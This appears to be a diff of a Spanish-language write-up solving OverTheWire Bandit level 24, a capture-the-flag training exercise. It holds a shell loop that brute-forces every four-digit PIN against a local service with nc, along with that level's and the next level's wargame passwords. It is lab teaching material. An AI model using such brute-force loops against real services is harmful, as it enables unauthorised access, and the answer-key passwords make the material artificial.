@@ -5,6 +5,7 @@ You do not need to create new connections each time
 bandit24@bandit.labs.overthewire.org -p 2220
 contraseña del anterior nivel: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
 ## Solucion
+```
 bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002
 Wrong! Please enter the correct pincode. Try again.
 Wrong! Please enter the correct pincode. Try again.
@@ -22,6 +23,7 @@ Wrong! Please enter the correct pincode. Try again.
 Wrong! Please enter the correct pincode. Try again.
 Correct!
 The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+```
 ## Notas adicionales 
 hacemos un for en la terminal como en python y utilizamos el comando **echo**
 ## Referencias 
